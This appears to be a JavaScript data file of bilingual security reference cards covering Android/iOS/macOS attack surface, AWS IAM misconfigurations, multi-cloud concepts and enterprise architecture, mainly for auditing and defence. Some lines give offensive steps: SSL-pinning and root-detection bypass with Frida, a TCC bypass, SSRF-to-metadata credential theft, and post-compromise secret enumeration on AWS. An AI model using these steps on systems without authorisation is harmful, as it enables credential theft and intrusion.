</ul>

<h2>Android — defense in apps</h2>
<ul>
  <li><strong>R8/ProGuard with custom rules.</strong> Default rules don't shrink — symbolic info still leaks. Custom <code>-keep</code> + <code>-renamesourcefileattribute</code>.</li>
  <li><strong>Integrity checks.</strong> Multi-source verification: signature check + native-code anchor + remote attestation (Play Integrity API).</li>
  <li><strong>Secrets in code.</strong> Don't. <code>EncryptedSharedPreferences</code> + KeyStore-backed key for anything that must persist on device.</li>
  <li><strong>WebView hardening.</strong> <code>setJavaScriptEnabled(false)</code> unless required; <code>setAllowFileAccess(false)</code>; <code>setAllowUniversalAccessFromFileURLs(false)</code>.</li>
</ul>

<h2>Android — forensic acquisition modes</h2>
<ul>
  <li><strong>Logical pull (ADB backup).</strong> <code>adb backup -all -shared -system</code>. Limited to what backups expose; many apps mark themselves unbackup.</li>
  <li><strong>File-system pull (rooted).</strong> <code>adb shell su -c 'tar -czf /sdcard/full.tgz /data/data /data/system'</code>. Comprehensive but invasive — root may not survive next boot.</li>
  <li><strong>Physical (EDL/JTAG).</strong> Chipset-specific. Qualcomm Emergency Download Mode → firehose loader → full eMMC dump.</li>
  <li><strong>Chip-off.</strong> Desolder eMMC, read in standalone reader. Destructive; device cannot be reassembled into evidence chain easily.</li>
</ul>

<h2>iOS</h2>
<ul>
  <li><strong>Entitlement model.</strong> <code>codesign -d --entitlements - /path/to/app</code> dumps entitlements. Anything beyond the standard set is a question to ask.</li>
  <li><strong>Sandbox.</strong> Apps confined to container; access to other-app data requires entitlement, App Groups, or shared keychain group.</li>
  <li><strong>Runtime instrumentation.</strong> <code>frida -U -n AppName</code> on a jailbroken device. Without JB: re-sign IPA with Frida gadget embedded, install via TrollStore/AltStore.</li>
  <li><strong>Static analysis.</strong> <code>otool -L</code> for linked frameworks; <code>class-dump</code> for Obj-C runtime classes; Hopper for Swift/Obj-C disassembly.</li>
  <li><strong>App-clip / URL scheme abuse.</strong> Universal Links with weak Apple-App-Site-Association can be hijacked.</li>
</ul>

<h2>macOS</h2>
<ul>
  <li><strong>TCC.</strong> Transparency, Consent, Control. Access to Camera, Microphone, Documents, Desktop requires user-prompted grant. TCC.db at <code>~/Library/Application Support/com.apple.TCC/TCC.db</code>. Bypass via <code>tccd</code> hijack on un-SIP'd systems.</li>
  <li><strong>Codesign mechanics.</strong> <code>codesign --verify --verbose /path</code>; <code>spctl -a -v /path</code> for Gatekeeper assessment. Notarization required for distribution outside MAS since 10.15.</li>
  <li><strong>Persistence locations.</strong> LaunchAgents (<code>~/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>), LaunchDaemons (<code>/Library/LaunchDaemons</code>), Login Items, cron, periodic.</li>
  <li><strong>EndpointSecurity framework.</strong> Modern macOS EDR hooks here for process exec, file open, fork events. Successor to deprecated kauth/kext.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>On mobile, the attacker's biggest lever is usually a single missing check on an exported component or a single hardcoded secret. The 80/20 of mobile review is reading the manifest carefully and grep-ing the decompiled source for keys, tokens, and URLs.</div>
`,
      `
<h2>Android — Attack-Surface-Review</h2>
<ul>
  <li><strong>APK-Unpacking.</strong> <code>apktool d app.apk</code> für Resources + smali; <code>jadx-gui app.apk</code> für decompiled Java. <code>AndroidManifest.xml</code> zuerst lesen — exportierte Activities, Services, Provider, Receiver sind Entry-Points.</li>
  <li><strong>Permission-Modell.</strong> Dangerous Permissions (CAMERA, LOCATION, READ_SMS) brauchen Runtime-Grant ab API 23. <code>checkSelfPermission</code> + Early-Return-Logik suchen; fehlende Checks = Bypass.</li>
  <li><strong>Exportierte Komponenten.</strong> <code>android:exported="true"</code> ohne Intent-Filter-Permission = aus jeder installierten App aufrufbar. <code>drozer console connect</code>, <code>run app.activity.start --component pkg cls</code>.</li>
  <li><strong>Unsichere Deep-Links.</strong> Custom Scheme + WebView <code>loadUrl</code> auf Intent-Extras = lokales File-Read oder beliebiger URL-Load. <code>file://</code>-Handling prüfen.</li>
  <li><strong>Network-Security-Config.</strong> <code>res/xml/network_security_config.xml</code> — <code>cleartextTrafficPermitted</code>, Custom-Trust-Anchors, Certificate-Pinning. Erste Defender-Härtung.</li>
  <li><strong>SSL-Pinning-Bypass.</strong> Frida-Script <code>frida -U -l ssl-pinning-bypass.js -f pkg</code> oder <code>objection -g pkg explore</code> → <code>android sslpinning disable</code>.</li>
  <li><strong>Root-Detection-Bypass.</strong> Gleiche Frida-Toolchain — <code>RootBeer</code>, <code>SafetyNet</code> oder per-App-Heuristiken hooken.</li>
</ul>

<h2>Android — Verteidigung in Apps</h2>
<ul>
  <li><strong>R8/ProGuard mit Custom-Rules.</strong> Default-Rules shrinken nicht — Symbol-Info leakt noch. Custom <code>-keep</code> + <code>-renamesourcefileattribute</code>.</li>
  <li><strong>Integrity-Checks.</strong> Multi-Source-Verifikation: Signature-Check + Native-Code-Anker + Remote-Attestation (Play Integrity API).</li>
  <li><strong>Secrets im Code.</strong> Nein. <code>EncryptedSharedPreferences</code> + KeyStore-backed Key für alles was persistieren muss.</li>
  <li><strong>WebView-Härtung.</strong> <code>setJavaScriptEnabled(false)</code> wenn nicht nötig; <code>setAllowFileAccess(false)</code>; <code>setAllowUniversalAccessFromFileURLs(false)</code>.</li>
</ul>

<h2>Android — Forensik-Akquisitionsmodi</h2>
<ul>
  <li><strong>Logical Pull (ADB-Backup).</strong> <code>adb backup -all -shared -system</code>. Begrenzt auf was Backups exponieren; viele Apps markieren sich unbackup.</li>
  <li><strong>File-System-Pull (rooted).</strong> <code>adb shell su -c 'tar -czf /sdcard/full.tgz /data/data /data/system'</code>. Umfassend, aber invasiv — Root überlebt nächsten Boot vielleicht nicht.</li>
  <li><strong>Physisch (EDL/JTAG).</strong> Chipset-spezifisch. Qualcomm Emergency Download Mode → Firehose-Loader → voller eMMC-Dump.</li>
  <li><strong>Chip-Off.</strong> eMMC ablöten, in Standalone-Reader lesen. Destruktiv; Gerät kann nicht leicht in Evidence-Chain zurück.</li>
</ul>

<h2>iOS</h2>
<ul>
  <li><strong>Entitlement-Modell.</strong> <code>codesign -d --entitlements - /path/to/app</code> dumpt Entitlements. Alles jenseits des Standard-Sets ist eine Frage.</li>
  <li><strong>Sandbox.</strong> Apps auf Container beschränkt; Zugriff auf andere App-Daten erfordert Entitlement, App-Groups oder shared Keychain-Group.</li>
  <li><strong>Runtime-Instrumentation.</strong> <code>frida -U -n AppName</code> auf jailbroken Device. Ohne JB: IPA mit eingebettetem Frida-Gadget neu signieren, via TrollStore/AltStore installieren.</li>
  <li><strong>Static-Analyse.</strong> <code>otool -L</code> für linked Frameworks; <code>class-dump</code> für Obj-C-Runtime-Klassen; Hopper für Swift-/Obj-C-Disassembly.</li>
  <li><strong>App-Clip / URL-Scheme-Missbrauch.</strong> Universal Links mit schwacher Apple-App-Site-Association hijackbar.</li>
</ul>

<h2>macOS</h2>
<ul>
  <li><strong>TCC.</strong> Transparency, Consent, Control. Zugriff auf Camera, Microphone, Documents, Desktop erfordert User-Prompt-Grant. TCC.db unter <code>~/Library/Application Support/com.apple.TCC/TCC.db</code>. Bypass via <code>tccd</code>-Hijack auf un-SIP'd Systemen.</li>
  <li><strong>Codesign-Mechanik.</strong> <code>codesign --verify --verbose /path</code>; <code>spctl -a -v /path</code> für Gatekeeper-Assessment. Notarization erforderlich für Distribution außerhalb MAS seit 10.15.</li>
  <li><strong>Persistenz-Orte.</strong> LaunchAgents (<code>~/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>), LaunchDaemons (<code>/Library/LaunchDaemons</code>), Login Items, cron, periodic.</li>
  <li><strong>EndpointSecurity-Framework.</strong> Modernes macOS-EDR hookt hier für Process-Exec, File-Open, Fork-Events. Nachfolger des deprecated kauth/kext.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Auf Mobile ist der größte Hebel meist ein einzelner fehlender Check auf einer exportierten Komponente oder ein einzelnes hardcodiertes Secret. Das 80/20 von Mobile-Review ist sorgfältiges Lesen des Manifests und Greppen der decompiled Source nach Keys, Tokens, URLs.</div>
`
    ),
    phases: []
  },

  // ─────────────────────────────────────────────────────────────
  // 03 — CLOUD & MODERN INFRASTRUCTURE
  // ─────────────────────────────────────────────────────────────
  {
    id: "aws-security-reference",
    domain: "cloud-infrastructure", tier: 2,
    title: T("AWS Security Reference", "AWS Security — Referenz"),
    blurb: T(
      "IAM modeling, cross-account boundaries, and the highest-leverage misconfigurations to look for first on AWS.",
      "IAM-Modellierung, Cross-Account-Grenzen und die Fehlkonfigurationen mit dem höchsten Hebel, die man auf AWS zuerst sucht."
    ),
    body: B(
      `
<h2>IAM — model and traps</h2>
<ul>
  <li><strong>Policy evaluation logic.</strong> Explicit Deny &gt; Org SCP &gt; Resource policy &gt; Identity policy &gt; Permissions boundary. A single explicit Deny anywhere kills the action. Default = implicit deny.</li>
  <li><strong>The five overly-broad patterns.</strong> <code>"Action":"*"</code>, <code>"Resource":"*"</code>, <code>"Principal":"*"</code>, <code>"Condition":{}</code> empty, <code>"Effect":"Allow"</code> at root. Any combination of two = high-impact finding.</li>
  <li><strong>iam:PassRole misuse.</strong> Principal can pass a role to a service that they themselves can't assume. <code>iam:PassRole</code> on <code>*</code> = path to any service role.</li>
  <li><strong>Confused deputy.</strong> Trusted third-party (Lambda, GitHub OIDC) can be tricked into using your role on attacker's behalf. Defense: <code>aws:SourceArn</code> + <code>aws:SourceAccount</code> conditions on trust policies.</li>
  <li><strong>Wildcard in resource ARN.</strong> <code>arn:aws:s3:::data-*</code> matches future buckets named <code>data-attacker</code> — register the bucket name, gain implicit access.</li>
</ul>

<h2>Cross-account boundaries</h2>
<ul>
  <li><strong>Trust-relationship discovery.</strong> Walk every role's <code>AssumeRolePolicyDocument</code> for <code>Principal: {"AWS": "arn:aws:iam::OTHER_ACCOUNT:root"}</code> entries. Every such entry is an external-account access vector.</li>
  <li><strong>AssumeRole chain.</strong> AWS supports role-chaining (assume role A, then use A to assume B). Each hop drops one hour from max session duration. <code>aws sts decode-authorization-message</code> for chain-failure debug.</li>
  <li><strong>SCP at OU boundary.</strong> SCPs apply to all accounts in the OU but only restrict identity-based and resource-based policies — they don't grant. A child account loses access if parent SCP denies.</li>
  <li><strong>Org-wide blast radius.</strong> Single overly-trusting role in a management account = entire org compromise via Organizations API.</li>
</ul>

<h2>Highest-leverage misconfigs — triage sequence</h2>
<ol>
  <li><strong>Public S3 buckets.</strong> <code>aws s3api list-buckets</code>, then <code>aws s3api get-bucket-acl</code> + <code>get-bucket-policy</code> on each. Block Public Access settings at account level should be ON.</li>
  <li><strong>Stale IAM users with access keys.</strong> <code>aws iam list-users</code> + <code>list-access-keys</code> + <code>get-access-key-last-used</code>. Keys unused for &gt;90 days = revoke immediately.</li>
  <li><strong>EC2 instance metadata v1 still allowed.</strong> <code>aws ec2 describe-instances</code> + check <code>HttpTokens</code>. <code>optional</code> = SSRF can grab role creds. Force <code>required</code>.</li>
  <li><strong>RDS snapshots public.</strong> <code>aws rds describe-db-snapshots --include-public</code>. Public snapshot = entire database leaked to anyone in AWS.</li>
  <li><strong>Lambda function URLs with auth NONE.</strong> <code>aws lambda list-function-url-configs</code>. <code>AuthType: NONE</code> = unauthenticated invoke.</li>
  <li><strong>Sigv4 unsigned services.</strong> Any API Gateway or Lambda URL exposed without auth.</li>
  <li><strong>KMS key policy too permissive.</strong> <code>"Principal":"*"</code> on a KMS key = anyone in your org (or, with cross-account allow, anywhere) can decrypt with it.</li>
  <li><strong>CloudTrail not multi-region or not enabled.</strong> <code>aws cloudtrail describe-trails</code>. Single-region trail = blind to other regions.</li>
</ol>

<h2>Post-compromise pivots on AWS</h2>
<ul>
  <li><strong>EC2 instance-profile cred theft.</strong> SSRF → IMDS → <code>/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> → temporary creds.</li>
  <li><strong>Lambda env var leak.</strong> Many Lambdas store secrets in env vars. <code>aws lambda get-function-configuration --function-name X</code>.</li>
  <li><strong>Secrets Manager scan.</strong> <code>aws secretsmanager list-secrets --max-results 100</code>, then <code>get-secret-value</code> per secret your role can read.</li>
  <li><strong>SSM Parameter Store.</strong> Same pattern. <code>aws ssm describe-parameters</code> + <code>get-parameters --names X</code>.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Don't enumerate by walking every API. Run <code>pacu</code> or <code>cloudfox</code> first — both do the recon in minutes and produce a triage list. Manual API walking is for confirming the specific finding, not for discovery.</div>
`,
      `
<h2>IAM — Modell und Fallen</h2>
<ul>
  <li><strong>Policy-Evaluation-Logik.</strong> Explicit Deny &gt; Org-SCP &gt; Resource-Policy &gt; Identity-Policy &gt; Permissions-Boundary. Ein einziges Explicit Deny irgendwo tötet die Action. Default = Implicit Deny.</li>
  <li><strong>Die fünf zu-breiten Muster.</strong> <code>"Action":"*"</code>, <code>"Resource":"*"</code>, <code>"Principal":"*"</code>, <code>"Condition":{}</code> leer, <code>"Effect":"Allow"</code> auf Root. Jede Kombination aus zweien = High-Impact-Befund.</li>
  <li><strong>iam:PassRole-Missbrauch.</strong> Principal kann eine Role an einen Service übergeben, den er selbst nicht assumieren kann. <code>iam:PassRole</code> auf <code>*</code> = Pfad zu jeder Service-Role.</li>
  <li><strong>Confused Deputy.</strong> Trusted-Third-Party (Lambda, GitHub OIDC) kann getrickst werden, deine Role im Angreifer-Auftrag zu nutzen. Verteidigung: <code>aws:SourceArn</code> + <code>aws:SourceAccount</code>-Conditions in Trust-Policies.</li>
  <li><strong>Wildcard in Resource-ARN.</strong> <code>arn:aws:s3:::data-*</code> matcht künftige Buckets namens <code>data-attacker</code> — Bucket-Namen registrieren, impliziten Zugriff erhalten.</li>
</ul>

<h2>Cross-Account-Boundaries</h2>
<ul>
  <li><strong>Trust-Relationship-Discovery.</strong> Jeder Role <code>AssumeRolePolicyDocument</code> nach <code>Principal: {"AWS": "arn:aws:iam::OTHER_ACCOUNT:root"}</code>-Einträgen durchgehen. Jeder solche Eintrag ist External-Account-Access-Vector.</li>
  <li><strong>AssumeRole-Chain.</strong> AWS unterstützt Role-Chaining (assume A, dann mit A B assumieren). Jeder Hop verkürzt Max-Session-Duration um eine Stunde. <code>aws sts decode-authorization-message</code> für Chain-Failure-Debug.</li>
  <li><strong>SCP an OU-Grenze.</strong> SCPs gelten für alle Accounts in der OU, beschränken aber nur Identity- und Resource-basierte Policies — sie gewähren nicht. Ein Child-Account verliert Zugriff wenn Parent-SCP denyed.</li>
  <li><strong>Org-weiter Blast-Radius.</strong> Einzige zu vertrauensvolle Role in einem Management-Account = gesamte Org-Kompromittierung via Organizations-API.</li>
</ul>

<h2>Höchster-Hebel-Misconfigs — Triage-Sequenz</h2>
<ol>
  <li><strong>Öffentliche S3-Buckets.</strong> <code>aws s3api list-buckets</code>, dann <code>aws s3api get-bucket-acl</code> + <code>get-bucket-policy</code> pro Bucket. Block-Public-Access auf Account-Ebene sollte AN sein.</li>
  <li><strong>Veraltete IAM-User mit Access-Keys.</strong> <code>aws iam list-users</code> + <code>list-access-keys</code> + <code>get-access-key-last-used</code>. Keys ungenutzt &gt;90 Tage = sofort revoken.</li>
  <li><strong>EC2-IMDSv1 noch erlaubt.</strong> <code>aws ec2 describe-instances</code> + <code>HttpTokens</code> prüfen. <code>optional</code> = SSRF kann Role-Creds greifen. <code>required</code> erzwingen.</li>
  <li><strong>RDS-Snapshots öffentlich.</strong> <code>aws rds describe-db-snapshots --include-public</code>. Öffentliches Snapshot = gesamte DB an jeden in AWS geleakt.</li>
  <li><strong>Lambda-Function-URLs mit Auth NONE.</strong> <code>aws lambda list-function-url-configs</code>. <code>AuthType: NONE</code> = unauthenticated Invoke.</li>
  <li><strong>SigV4-unsignierte Services.</strong> Jedes API-Gateway oder Lambda-URL ohne Auth exponiert.</li>
  <li><strong>KMS-Key-Policy zu permissiv.</strong> <code>"Principal":"*"</code> auf KMS-Key = jeder in deiner Org (oder bei Cross-Account-Allow, überall) kann damit entschlüsseln.</li>
  <li><strong>CloudTrail nicht Multi-Region oder nicht aktiv.</strong> <code>aws cloudtrail describe-trails</code>. Single-Region-Trail = blind auf andere Regionen.</li>
</ol>

<h2>Post-Compromise-Pivots auf AWS</h2>
<ul>
  <li><strong>EC2-Instance-Profile-Cred-Diebstahl.</strong> SSRF → IMDS → <code>/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> → temporäre Creds.</li>
  <li><strong>Lambda-Env-Var-Leak.</strong> Viele Lambdas speichern Secrets in Env-Vars. <code>aws lambda get-function-configuration --function-name X</code>.</li>
  <li><strong>Secrets-Manager-Scan.</strong> <code>aws secretsmanager list-secrets --max-results 100</code>, dann <code>get-secret-value</code> pro Secret, das deine Role lesen kann.</li>
  <li><strong>SSM-Parameter-Store.</strong> Gleiches Muster. <code>aws ssm describe-parameters</code> + <code>get-parameters --names X</code>.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Nicht durch Walken jeder API enumerieren. Zuerst <code>pacu</code> oder <code>cloudfox</code> laufen lassen — beide machen die Recon in Minuten und produzieren eine Triage-Liste. Manuelles API-Walken zum Bestätigen des spezifischen Befunds, nicht zur Discovery.</div>
`
    ),
    phases: ["recon", "cves", "report"]
  },
  {
    id: "cloud-security-generalist",
    domain: "cloud-infrastructure", tier: 2,
    title: T("Cloud Security — Generalist Reference", "Cloud Security — Generalisten-Referenz"),
    blurb: T(
      "Cross-provider security concepts that survive cloud-vendor differences: identity, network, data, control plane vs. data plane.",
      "Provider-übergreifende Sicherheitskonzepte, die Cloud-Vendor-Unterschiede überstehen: Identity, Netzwerk, Daten, Control-Plane vs. Data-Plane."
    ),
    body: B(
      `
<h2>Identity — same concept, three names</h2>
<ul>
  <li><strong>AWS.</strong> IAM users, IAM roles, IAM groups, SCPs, permission boundaries. Federation via SAML or OIDC (Cognito, IAM Identity Center).</li>
  <li><strong>Azure.</strong> Entra ID (formerly AAD) users, groups, service principals, managed identities. RBAC at scope (subscription / resource group / resource). Conditional Access for policy.</li>
  <li><strong>GCP.</strong> Cloud Identity users, service accounts, groups. IAM bindings at organization / folder / project / resource. Workload Identity Federation for non-GCP workloads.</li>
  <li><strong>Common gotcha.</strong> All three default to deny but their inheritance models differ. AWS = explicit deny wins, no inheritance. Azure = RBAC inherits down scope. GCP = bindings inherit down resource hierarchy. Don't assume.</li>
</ul>

<h2>Network — VPC equivalents</h2>
<ul>
  <li><strong>AWS VPC.</strong> CIDR per VPC; subnets per AZ; route tables decide reachability; security groups are stateful; NACLs are stateless.</li>
  <li><strong>Azure VNet.</strong> CIDR per VNet; subnets; NSGs are stateful; Azure Firewall stateful; UDRs override system routes.</li>
  <li><strong>GCP VPC.</strong> Global VPC (unlike the other two); regional subnets; firewall rules are stateful and apply by tag/SA.</li>
  <li><strong>Peering.</strong> Non-transitive in all three. A peered to B and B to C ≠ A to C. Hub-and-spoke topologies use Transit Gateway (AWS), VWAN (Azure), Network Connectivity Center (GCP).</li>
  <li><strong>Egress control.</strong> The single highest-impact lever for compromise containment. AWS NAT gateway + VPC endpoints + Network Firewall; Azure Firewall + Private Link; GCP Cloud NAT + VPC Service Controls.</li>
</ul>

<h2>Data — encryption-key-management split</h2>
<ul>
  <li><strong>Provider-managed.</strong> AWS S3 SSE-S3, Azure Storage Service Encryption with platform-managed keys, GCP default encryption. Zero customer effort, zero customer control.</li>
  <li><strong>Customer-managed in provider KMS.</strong> AWS SSE-KMS, Azure customer-managed keys in Key Vault, GCP CMEK in Cloud KMS. Customer controls rotation, audit, deletion; key material is provider-managed.</li>
  <li><strong>Customer-supplied (BYOK + HYOK).</strong> Customer supplies key material from their HSM. AWS XKS, Azure HYOK, GCP EKM. Highest sovereignty, highest complexity.</li>
  <li><strong>Crypto erasure.</strong> Delete the key, the data is unreadable. Faster than overwriting petabytes. Compliance-relevant for right-to-be-forgotten.</li>
</ul>

<h2>Control plane vs data plane</h2>
<ul>
  <li><strong>Control plane.</strong> The API that creates/configures resources. CloudTrail (AWS), Activity Log (Azure), Cloud Audit Logs Admin Activity (GCP). Always log; usually small volume.</li>
  <li><strong>Data plane.</strong> The API that reads/writes data within resources. S3 object access, KeyVault secret reads, GCS object reads. High volume; often not logged by default.</li>
  <li><strong>Audit surprise.</strong> Defender thinks they have full coverage because CloudTrail is on. Attacker exfiltrates from S3 via data-plane API; defender sees nothing.</li>
  <li><strong>Per-provider data-plane logging.</strong> AWS S3 Server Access Logs / CloudTrail Data Events (extra cost); Azure Storage Analytics; GCP Cloud Audit Logs Data Access (off by default).</li>
</ul>

<h2>Multi-cloud comparison table — fast lookup</h2>
<ul>
  <li><strong>Metadata service.</strong> AWS <code>169.254.169.254</code>, Azure <code>169.254.169.254</code> + header <code>Metadata: true</code>, GCP <code>metadata.google.internal</code> + header <code>Metadata-Flavor: Google</code>.</li>
  <li><strong>Default encryption.</strong> AWS S3 since 2023 yes, Azure Blob yes, GCP yes — all at rest.</li>
  <li><strong>Public block at account level.</strong> AWS Block Public Access; Azure has per-storage-account public access; GCP uniform bucket-level access.</li>
  <li><strong>Org-wide policy.</strong> AWS SCP; Azure Policy + Management Groups; GCP Org Policy + Folders.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>If you're auditing a multi-cloud environment, audit each provider separately first. Cross-cloud findings (federation, shared SSO, replicated data) come second and depend on having a clean per-cloud baseline.</div>
`,
      `
<h2>Identity — gleiches Konzept, drei Namen</h2>
<ul>
  <li><strong>AWS.</strong> IAM-Users, IAM-Roles, IAM-Groups, SCPs, Permission-Boundaries. Federation via SAML oder OIDC (Cognito, IAM Identity Center).</li>
  <li><strong>Azure.</strong> Entra ID (früher AAD) Users, Groups, Service-Principals, Managed Identities. RBAC am Scope (Subscription / Resource-Group / Resource). Conditional Access für Policy.</li>
  <li><strong>GCP.</strong> Cloud Identity Users, Service-Accounts, Groups. IAM-Bindings auf Organization / Folder / Project / Resource. Workload Identity Federation für Non-GCP-Workloads.</li>
  <li><strong>Gemeinsame Falle.</strong> Alle drei sind default Deny, aber ihre Inheritance-Modelle unterscheiden sich. AWS = Explicit Deny gewinnt, keine Inheritance. Azure = RBAC erbt scope-abwärts. GCP = Bindings erben resource-hierarchy-abwärts. Nicht annehmen.</li>
</ul>

<h2>Netzwerk — VPC-Äquivalente</h2>
<ul>
  <li><strong>AWS VPC.</strong> CIDR pro VPC; Subnets pro AZ; Route-Tables entscheiden Reachability; Security-Groups stateful; NACLs stateless.</li>
  <li><strong>Azure VNet.</strong> CIDR pro VNet; Subnets; NSGs stateful; Azure Firewall stateful; UDRs überschreiben System-Routes.</li>
  <li><strong>GCP VPC.</strong> Globale VPC (anders als die anderen zwei); regionale Subnets; Firewall-Rules stateful, gelten per Tag/SA.</li>
  <li><strong>Peering.</strong> In allen dreien non-transitiv. A gepeert mit B und B mit C ≠ A mit C. Hub-and-Spoke nutzt Transit Gateway (AWS), VWAN (Azure), Network Connectivity Center (GCP).</li>
  <li><strong>Egress-Control.</strong> Der einzige höchste-Impact-Hebel für Containment. AWS NAT-Gateway + VPC-Endpoints + Network Firewall; Azure Firewall + Private Link; GCP Cloud NAT + VPC Service Controls.</li>
</ul>

<h2>Data — Encryption-Key-Management-Teilung</h2>
<ul>
  <li><strong>Provider-managed.</strong> AWS S3 SSE-S3, Azure Storage Service Encryption mit platform-managed Keys, GCP Default-Encryption. Null Kundenaufwand, null Kundenkontrolle.</li>
  <li><strong>Customer-managed in Provider-KMS.</strong> AWS SSE-KMS, Azure Customer-Managed Keys in Key Vault, GCP CMEK in Cloud KMS. Kunde kontrolliert Rotation, Audit, Löschung; Key-Material ist provider-managed.</li>
  <li><strong>Customer-Supplied (BYOK + HYOK).</strong> Kunde liefert Key-Material aus eigenem HSM. AWS XKS, Azure HYOK, GCP EKM. Höchste Souveränität, höchste Komplexität.</li>
  <li><strong>Crypto-Erasure.</strong> Key löschen, Daten unlesbar. Schneller als Petabytes überschreiben. Compliance-relevant für Right-to-be-Forgotten.</li>
</ul>

<h2>Control-Plane vs Data-Plane</h2>
<ul>
  <li><strong>Control-Plane.</strong> Die API, die Ressourcen erstellt/konfiguriert. CloudTrail (AWS), Activity-Log (Azure), Cloud Audit Logs Admin Activity (GCP). Immer loggen; meist kleines Volumen.</li>
  <li><strong>Data-Plane.</strong> Die API, die Daten innerhalb von Ressourcen liest/schreibt. S3-Object-Access, KeyVault-Secret-Reads, GCS-Object-Reads. Hohes Volumen; oft per default nicht geloggt.</li>
  <li><strong>Audit-Überraschung.</strong> Verteidiger denkt, er habe volle Abdeckung, weil CloudTrail an ist. Angreifer exfiltriert aus S3 via Data-Plane-API; Verteidiger sieht nichts.</li>
  <li><strong>Per-Provider-Data-Plane-Logging.</strong> AWS S3 Server Access Logs / CloudTrail Data Events (Extra-Kosten); Azure Storage Analytics; GCP Cloud Audit Logs Data Access (per default aus).</li>
</ul>

<h2>Multi-Cloud-Vergleichstabelle — schnelle Referenz</h2>
<ul>
  <li><strong>Metadata-Service.</strong> AWS <code>169.254.169.254</code>, Azure <code>169.254.169.254</code> + Header <code>Metadata: true</code>, GCP <code>metadata.google.internal</code> + Header <code>Metadata-Flavor: Google</code>.</li>
  <li><strong>Default-Encryption.</strong> AWS S3 seit 2023 ja, Azure Blob ja, GCP ja — alle at-rest.</li>
  <li><strong>Public-Block auf Account-Level.</strong> AWS Block Public Access; Azure hat per-Storage-Account-Public-Access; GCP Uniform Bucket-Level Access.</li>
  <li><strong>Org-weite Policy.</strong> AWS SCP; Azure Policy + Management Groups; GCP Org Policy + Folders.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Bei einem Multi-Cloud-Audit jeden Provider zuerst separat auditieren. Cross-Cloud-Befunde (Federation, shared SSO, replizierte Daten) kommen danach und setzen eine saubere Per-Cloud-Baseline voraus.</div>
`
    ),
    phases: ["recon", "fingerprint", "cves"]
  },
  {
    id: "enterprise-security-architecture",
    domain: "cloud-infrastructure", tier: 2,
    title: T("Enterprise Security Architecture", "Enterprise Security Architecture"),
    blurb: T(
      "Reference architecture patterns for security at enterprise scale, paired with the cross-industry view of which platform choices the field is moving toward.",
      "Referenzarchitektur-Muster für Sicherheit im Unternehmensmaßstab, ergänzt um die branchenübergreifende Sicht, wohin sich Plattform-Entscheidungen bewegen."
    ),
    body: B(
      `
<h2>Zero-trust network access (ZTNA)</h2>
<ul>
  <li><strong>Pattern.</strong> No implicit trust based on network position. Every request authenticated + authorized at the resource. VPN replaced by identity-aware proxy or per-app tunnels.</li>
  <li><strong>Common failure.</strong> Legacy services bolted in via "trusted network" exception. Each exception erodes the model. Sunset list with deadlines, not allowlist with no review.</li>
  <li><strong>Vendors.</strong> Cloudflare Access, Zscaler Private Access, Tailscale, Google BeyondCorp, Microsoft Entra Private Access. Pick by identity-provider fit + protocol coverage (HTTP-only vs full L4).</li>
</ul>

<h2>Identity-aware proxy</h2>
<ul>
  <li><strong>Pattern.</strong> Single ingress point per application; proxy authenticates the user against IdP, attaches identity headers, forwards to backend. Backend trusts only the proxy.</li>
  <li><strong>Common failure.</strong> Backend reachable bypassing proxy (private IP exposed, container port-forward, accidental public LB). Audit by trying to hit backend directly from peer network.</li>
  <li><strong>Hardening.</strong> mTLS between proxy and backend; backend rejects any cert except proxy's. Signed identity headers (JWT) so backend can verify they came from the proxy.</li>
</ul>

<h2>Secrets-manager-backed credential flow</h2>
<ul>
  <li><strong>Pattern.</strong> Apps never hold long-lived secrets. App identity (workload identity, IAM role, Pod SA) → secrets manager → short-lived credential.</li>
  <li><strong>Vendors.</strong> HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager, Doppler, 1Password Connect.</li>
  <li><strong>Common failure.</strong> Bootstrap problem solved by hardcoding the bootstrap token in the AMI/image. Audit by grepping images for known token formats.</li>
  <li><strong>Rotation.</strong> Automated, scheduled, observable. Vault dynamic secrets are the canonical example — DB credentials valid for 1 hour, regenerated on demand.</li>
</ul>

<h2>Secure software delivery pipeline</h2>
<ul>
  <li><strong>Pattern.</strong> Code → CI → signed artifact → registry → policy gate → deploy. Every transition signed and logged.</li>
  <li><strong>Signing.</strong> Sigstore (cosign) for containers, in-toto attestations for build provenance, SLSA framework for maturity ranking.</li>
  <li><strong>Policy gates.</strong> OPA/Gatekeeper or Kyverno in K8s; admission controllers reject unsigned or non-policy-compliant deployments.</li>
  <li><strong>Common failure.</strong> CI runner has wide cloud permissions (deploys with admin role). Pipeline compromise → cloud compromise. Defense: per-job federated identity, scoped to the deploy target.</li>
</ul>

<h2>SOC integration patterns</h2>
<ul>
  <li><strong>Detection-as-code.</strong> Detection rules versioned in git, tested in CI, deployed via pipeline. Sigma format → SIEM-specific compilation.</li>
  <li><strong>SOAR runbooks.</strong> Each alert maps to a runbook with explicit decision points and automatable steps. Manual triage as fallback, not default.</li>
  <li><strong>Threat intel ingestion.</strong> STIX/TAXII feeds → SIEM watchlists. Quality &gt; volume; one curated paid feed beats five free firehoses.</li>
</ul>

<h2>Regulated-industry variants</h2>
<ul>
  <li><strong>Finance.</strong> Heavy emphasis on segregation of duties; change management with multi-approver gates; tamper-evident logging (often append-only S3 + Object Lock).</li>
  <li><strong>Healthcare.</strong> HIPAA-driven PHI segregation; minimum-necessary access; BAA chain with every vendor that touches PHI.</li>
  <li><strong>Government.</strong> FedRAMP / IL4–IL6 deployment patterns; FIPS-validated crypto; supply-chain attestation requirements.</li>
  <li><strong>Critical infrastructure.</strong> NERC CIP / NIS2 — physical security, IT/OT segmentation, mandatory incident reporting timelines.</li>
</ul>

<h2>Technology trends (current)</h2>
<ul>
  <li><strong>Toward.</strong> Workload identity federation (kills static cloud creds in CI); eBPF-based runtime security; supply-chain SBOM + signing; SaaS SIEM with managed detections.</li>
